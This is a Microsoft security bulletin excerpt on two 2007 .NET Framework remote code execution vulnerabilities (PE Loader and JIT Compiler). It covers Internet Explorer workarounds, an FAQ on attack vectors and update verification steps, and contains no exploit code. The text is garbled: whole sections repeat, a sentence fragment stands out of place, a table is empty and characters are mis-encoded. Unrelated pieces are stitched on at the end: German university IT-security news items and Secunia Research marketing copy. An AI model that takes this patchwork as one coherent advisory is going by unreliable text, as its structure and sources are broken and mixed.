  1. On the Internet Explorer **Tools** menu, click **Internet Options**.
  2. In the **Internet Options** dialog box, click the **Security** tab, and then click the **Internet** icon.
  3. Under **Security level for this zone**, move the slider to **High**. This sets the security level for all Web sites you visit to High.

  **Note** If no slider is visible, click **Default Level**, and then move the slider to **High**.

  **Note** Setting the level to **High** may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly even with the security setting set to **High**.

  **Impact of Workaround:** There are side effects to prompting before running ActiveX Controls and Active Scripting. Many Web sites that are on the Internet or on an intranet use ActiveX or Active Scripting to provide additional functionality. For example, an online e-commerce site or banking site may use ActiveX Controls to provide menus, ordering forms, or even account statements. Prompting before running ActiveX Controls or Active Scripting is a global setting that affects all Internet and intranet sites. You will be prompted frequently when you enable this workaround. For each prompt, if you feel you trust the site that you are visiting, click **Yes** to run ActiveX Controls or Active Scripting. If you do not want to be prompted for all these sites, use the steps outlined in "Add sites that you trust to the Internet Explorer Trusted sites zoneâ.

  **Add sites that you trust to the Internet Explorer Trusted sites zone.**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.

  **Note** Add any sites that you trust not to take malicious action on your computer. Two in particular that you may want to add are "\*.windowsupdate.microsoft.com" and â\*.update.microsoft.comâ (without the quotation marks). These are the sites that will host the update, and it requires an ActiveX Control to install the update.
* **Configure Internet Explorer to prompt before running Active Scripting or disable Active Scripting in the Internet and Local intranet security zone.**

  You can help protect against this vulnerability by changing your settings to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone. To do this, follow these steps:

  1. In Internet Explorer, click **Internet Options** on the **Tools** menu.
  2. Click the **Security** tab.
  3. Click **Internet**, and then click **Custom Level**.
  4. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt**or **Disable**, and then click **OK**.
  5. Click **Local intranet**, and then click **Custom Level**.
  6. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt**or **Disable**, and then click **OK**.
  7. Click **OK** two times to return to Internet Explorer.

  **Note** Disabling Active Scripting in the Internet and Local intranet security zones may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly.

  **Impact of Workaround:** There are side effects to prompting before running Active Scripting. Many Web sites that are on the Internet or on an intranet use Active Scripting to provide additional functionality. For example, an online e-commerce site or banking site may use Active Scripting to provide menus, ordering forms, or even account statements. Prompting before running Active Scripting is a global setting that affects all Internet and intranet sites. You will be prompted frequently when you enable this workaround. For each prompt, if you feel you trust the site that you are visiting, click **Yes** to run Active Scripting. If you do not want to be prompted for all these sites, use the steps outlined in "Add sites that you trust to the Internet Explorer Trusted sites zoneâ.

  **Add sites that you trust to the Internet Explorer Trusted sites zone.**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.

  **Note** Add any sites that you trust not to take malicious action on your computer. Two in particular that you may want to add are "\*.windowsupdate.microsoft.com" and â\*.update.microsoft.comâ (without the quotation marks). These are the sites that will host the update, and it requires an ActiveX Control to install the update.
* **Read e-mail messages in plain text format to help protect yourself from the HTML e-mail attack vector**

  You can help protect yourself against this vulnerability by changing your e-mail settings to read e-mail messages in plain text using Outlook 2002 and later, Outlook Express 6 and later, or Windows Mail. For information in Outlook, search âplain textâ in Help and review âRead messages in plain text.â In Outlook Express, search âplain textâ in Help and review âReducing your risk of getting e-mail viruses.â In Windows Mail, search âplain textâ in Help and review âSecurity and privacy in Windows Mail.â

  **Impact of Workaround:** E-mail messages that are viewed in plain text format will not contain pictures, specialized fonts, animations, or other rich content. Additionally:

  + The changes are applied to the preview pane and to open messages.
  + Pictures become attachments so that they are not lost.
  + Because the message is still in Rich Text or HTML format in the store, the object model (custom code solutions) may behave unexpectedly.
* **Disable .Net controls in Internet Explorer 7**

  You can help protect against this vulnerability by changing your settings to disable .NET controls in the Internet and Local intranet security zone. To do this, follow these steps:

  1. In Internet Explorer 7, click **Internet Options** on the **Tools** menu.
  2. Click the **Security** tab.
  3. Click **Internet**, and then click **Custom Level**.
  4. Change the following options to **Disabled**:
  5. .Net Framework
  6. Loose XAML
  7. XAML browser applications
  8. XPS documents
  9. .Net Framework-reliant components
  10. Run components not signed with Authenticode
  11. Run components signed with Authenticode
  12. Click **OK** to save the changes
  13. Make the same changes in other risk zones.
  14. Click **OK** two times to return to Internet Explorer.

  **Impact of workaround:** .NET controls will not load in the zones you have configured.

#### FAQ for .NET PE Loader Vulnerability - CVE-2007-0041:

**What is the scope of the vulnerability?**

If successfully exploited, this remote code execution vulnerability could allow the attacker to run arbitrary code as the logged-on user.

**What causes the vulnerability?**

An unchecked buffer in the .NET Framework PE Loader service.

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could make changes to the system with the permissions of the logged-on user. If a user is logged in with administrative user rights, an attacker could take complete control of the affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

**How could an attacker exploit the vulnerability?**

An attacker could host a specially crafted Web site that is designed to exploit this vulnerability through Internet Explorer and then persuade a user to view the Web site. This can also include Web sites that accept user-provided content or advertisements, Web sites that host user-provided content or advertisements, and compromised Web sites. These Web sites could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to persuade users to visit the Web site, typically by getting them to click a link in an e-mail message or in an Instant Messenger request that takes users to the attacker's Web site. After they click the link, they would be prompted to perform several actions. An attack could only occur after they performed these actions. It could also be possible to display specially crafted Web content by using banner advertisements or by using other methods to deliver Web content to affected systems.

**What systems are primarily at risk from the vulnerability?**

This vulnerability requires that a user is logged on and visits a Web site or runs a .NET application locally for any malicious action to occur. Therefore, any systems where Internet Explorer is used frequently, such as workstations or terminal servers, are at the most risk from this vulnerability.

**I am running Internet Explorer for Windows Server 2003. Does this mitigate this vulnerability?**

Yes. By default, Internet Explorer for Windows Server 2003 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). Enhanced Security Configuration is a group of preconfigured settings in Internet Explorer that can reduce the likelihood of a user or administrator downloading and running malicious Web content on a server. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See also [Managing Internet Explorer Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92055).

**What does the update do?**

The update removes the vulnerability by modifying the way that .NET Framework PE Loader validates the length of a message before it passes the message to the allocated buffer.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

No. Microsoft received information about this vulnerability through responsible disclosure.

#### Workarounds for .NET JIT Compiler Vulnerability - CVE-2007-0043:

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Set Internet and Local intranet security zone settings to âHighâ to prompt before running ActiveX Controls and Active Scripting in these zones.**

  You can help protect against this vulnerability by changing your settings for the Internet security zone to prompt before running ActiveX controls. You can do this by setting your browser security to **High**.

  To raise the browsing security level in Microsoft Internet Explorer, follow these steps:

  1. On the Internet Explorer **Tools** menu, click **Internet Options**.
  2. In the **Internet Options** dialog box, click the **Security** tab, and then click the **Internet** icon.
  3. Under **Security level for this zone**, move the slider to **High**. This sets the security level for all Web sites you visit to High.

  **Note** If no slider is visible, click **Default Level**, and then move the slider to **High**.

  **Note** Setting the level to **High** may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly even with the security setting set to **High**.

  **Impact of Workaround:** There are side effects to prompting before running ActiveX Controls and Active Scripting. Many Web sites that are on the Internet or on an intranet use ActiveX or Active Scripting to provide additional functionality. For example, an online e-commerce site or banking site may use ActiveX Controls to provide menus, ordering forms, or even account statements. Prompting before running ActiveX Controls or Active Scripting is a global setting that affects all Internet and intranet sites. You will be prompted frequently when you enable this workaround. For each prompt, if you feel you trust the site that you are visiting, click **Yes** to run ActiveX Controls or Active Scripting. If you do not want to be prompted for all these sites, use the steps outlined in "Add sites that you trust to the Internet Explorer Trusted sites zoneâ.

  **Add sites that you trust to the Internet Explorer Trusted sites zone.**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.

     **Note** Add any sites that you trust not to take malicious action on your computer. Two in particular that you may want to add are "\*.windowsupdate.microsoft.com" and â\*.update.microsoft.comâ (without the quotation marks). These are the sites that will host the update, and it requires an ActiveX Control to install the update.
* **Configure Internet Explorer to prompt before running Active Scripting or disable Active Scripting in the Internet and Local intranet security zone.**

  You can help protect against this vulnerability by changing your settings to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone. To do this, follow these steps:

  1. In Internet Explorer, click **Internet Options** on the **Tools** menu.
  2. Click the **Security** tab.
  3. Click **Internet**, and then click **Custom Level**.
  4. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt**or **Disable**, and then click **OK**.
  5. Click **Local intranet**, and then click **Custom Level**.
  6. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt**or **Disable**, and then click **OK**.
  7. Click **OK** two times to return to Internet Explorer.

  **Note** Disabling Active Scripting in the Internet and Local intranet security zones may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly.

  **Impact of Workaround:** There are side effects to prompting before running Active Scripting. Many Web sites that are on the Internet or on an intranet use Active Scripting to provide additional functionality. For example, an online e-commerce site or banking site may use Active Scripting to provide menus, ordering forms, or even account statements. Prompting before running Active Scripting is a global setting that affects all Internet and intranet sites. You will be prompted frequently when you enable this workaround. For each prompt, if you feel you trust the site that you are visiting, click **Yes** to run Active Scripting. If you do not want to be prompted for all these sites, use the steps outlined in "Add sites that you trust to the Internet Explorer Trusted sites zoneâ.

Two in particular that you may want to add are "\*.windowsupdate.microsoft.com" and â\*.update.microsoft.comâ (without the quotation marks). These are the sites that will host the update, and it requires an ActiveX Control to install the update.
* **Read e-mail messages in plain text format to help protect yourself from the HTML e-mail attack vector**

  You can help protect yourself against this vulnerability by changing your e-mail settings to read e-mail messages in plain text using Outlook 2002 and later, Outlook Express 6 and later, or Windows Mail. For information in Outlook, search âplain textâ in Help and review âRead messages in plain text.â In Outlook Express, search âplain textâ in Help and review âReducing your risk of getting e-mail viruses.â In Windows Mail, search âplain textâ in Help and review âSecurity and privacy in Windows Mail.â

  **Impact of Workaround:** E-mail messages that are viewed in plain text format will not contain pictures, specialized fonts, animations, or other rich content. Additionally:

  + The changes are applied to the preview pane and to open messages.
  + Pictures become attachments so that they are not lost.
  + Because the message is still in Rich Text or HTML format in the store, the object model (custom code solutions) may behave unexpectedly.

#### FAQ .NET JIT Compiler Vulnerability - CVE-2007-0043:

**What is the scope of the vulnerability?**

If successfully exploited, this remote code execution vulnerability could allow the attacker to run arbitrary code as the logged-on user.

**What causes the vulnerability?**

An unchecked buffer in the .NET Framework 2.0 JIT Compiler service within the .NET Framework.

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could make changes to the system with the permissions of the logged-on user. If a user is logged on with administrative user rights, an attacker could take complete control of the affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

**How could an attacker exploit the vulnerability?**

An attacker could host a specially crafted Web site that is designed to exploit this vulnerability through Internet Explorer and then persuade a user to view the Web site. This can also include Web sites that accept user-provided content or advertisements, Web sites that host user-provided content or advertisements, and compromised Web sites. These Web sites could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to persuade users to visit the Web site, typically by getting them to click a link in an e-mail message or in an Instant Messenger request that takes users to the attacker's Web site. It could also be possible to display specially crafted Web content by using banner advertisements or by using other methods to deliver Web content to affected systems.

**What systems are primarily at risk from the vulnerability?**

This vulnerability requires that a user is logged on and visits a Web site for any malicious action to occur. Therefore, any systems where Internet Explorer is used frequently, such as workstations or terminal servers, are at the most risk from this vulnerability.

**I am running Internet Explorer for Windows Server 2003. Does this mitigate this vulnerability?**

Yes. By default, Internet Explorer for Windows Server 2003 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). Enhanced Security Configuration is a group of preconfigured settings in Internet Explorer that can reduce the likelihood of a user or administrator downloading and running malicious Web content on a server. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See also [Managing Internet Explorer Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92055).

**What does the update do?**

The update removes the vulnerability by modifying the way that the .NET Framework 2.0 JIT Compiler validates the length of a message before it passes the message to the allocated buffer.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

No. Microsoft received information about this vulnerability through responsible disclosure.

#### Deployment Information

**Installing the Update**

When you install this security update, the installer checks to see if one or more of the files that are being updated on your system have previously been updated by a Microsoft hotfix.

For more information about the terminology that appears in this bulletin, such as *hotfix*, see [Microsoft Knowledge Base Article 824684](https://support.microsoft.com/kb/824684).

This security update supports the following setup switches.

Microsoft .NET Framework 1.1 (KB928366):

| Switch | Description |  |  |

**Verifying Update Installation**

* **Microsoft Baseline Security Analyzer**

  To verify that a security update has been applied to an affected system, you may be able to use the Microsoft Baseline Security Analyzer (MBSA) tool. See the section, Detection and Deployment Tools and Guidance, earlier in this bulletin for more information.
* **File Version Verification**

  **Note** Because there are several versions of Microsoft Windows, the following steps may be different on your computer. If they are, see your product documentation to complete these steps.

  1. Click **Start**, and then click **Search**.
  2. In the **Search Results pane**, click **All files and folders** under **Search Companion**.
  3. In the **All or part of the file name box**, type a file name from the appropriate file information table, and then click **Search**.
  4. In the list of files, right-click a file name from the appropriate file information table, and then click **Properties**.

     **Note** Depending on the version of the operating system or programs installed, some of the files that are listed in the file information table may not be installed.
  5. On the **Version** tab, determine the version of the file that is installed on your computer by comparing it to the version that is documented in the appropriate file information table.

     **Note** Attributes other than file version may change during installation. Comparing other file attributes to the information in the file information table is not a supported method of verifying the update installation. Also, in certain cases, files may be renamed during installation. If the file or version information is not present, use one of the other available methods to verify update installation.

**Removal Information**
To remove this update, use the Add or Remove Programs tool in Control Panel.

**Verifying Update Installation**

* **Microsoft Baseline Security Analyzer**

  To verify that a security update has been applied to an affected system, you may be able to use the Microsoft Baseline Security Analyzer (MBSA) tool. See the section, Detection and Deployment Tools and Guidance, earlier in this bulletin for more information.
* **File Version Verification**

  **Note** Because there are several versions of Microsoft Windows, the following steps may be different on your computer. If they are, see your product documentation to complete these steps.

  1. Click **Start**, and then click **Search**.
  2. In the **Search Results pane**, click **All files and folders** under **Search Companion**.
  3. In the **All or part of the file name box**, type a file name from the appropriate file information table, and then click **Search**.
  4. In the list of files, right-click a file name from the appropriate file information table, and then click **Properties**.

     **Note** Depending on the version of the operating system or programs installed, some of the files that are listed in the file information table may not be installed.
  5. On the **Version** tab, determine the version of the file that is installed on your computer by comparing it to the version that is documented in the appropriate file information table.

     **Note** Attributes other than file version may change during installation. Comparing other file attributes to the information in the file information table is not a supported method of verifying the update installation. Also, in certain cases, files may be renamed during installation. If the file or version information is not present, use one of the other available methods to verify update installation.

## Aktuelles

### [Anstehendes Support-Ende (âEnd of lifeâ) von Windows 10](/blog/2024-10-14-windows-10-end-of-life)

Wir weisen darauf hin, dass Windows 10 ab dem 14. Oktober 2025 keine kostenlosen Sicherheitsupdates mehr erhÃ¤lt und ohne weitere MaÃnahmen nicht mehr im Uninetz betrieben werden darf. Wir zeigen mÃ¶gliche Optionen fÃ¼r Windows-10-Rechner auf. FÃ¼r neue Hardware oder kostenpflichtige Sicherheitsupdates kÃ¶nnen Kosten auf die Betreiber:innen zukommen.

### [Windows-Feature âRecallâ](/blog/2024-06-19-recall)

Aus aktuellem Anlass weist die Stabsstelle Informationssicherheit auf Probleme mit dem neuen Windows-Feature âRecallâ hin und rÃ¤t von der Verwendung ab.

### [Umgang mit vermeintlichen Warnungen des Virenscanners im Browser](/blog/2024-05-13-malicious-browser-popups)

Immer wieder erhalten wir Anfragen von Nutzer:innen, bei denen der Rechner den Fund von Malware meldet. Nicht in allen FÃ¤llen sind dies echte Warnungen unserer Endpoint Protection LÃ¶sung. Die andere ErklÃ¤rung ist, dass es sich um Push-Nachrichten aus dem Browser handeln kann, mit der die Person vor dem Rechner dazu verleitet werden soll, Malware zu installieren. Wir zeigen, wie sich falsche von echten Meldungen unterscheiden lassen und beschreiben am Beispiel von Google Chrome, wie Push-Nachrichten deaktiviert werden kÃ¶nnen.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
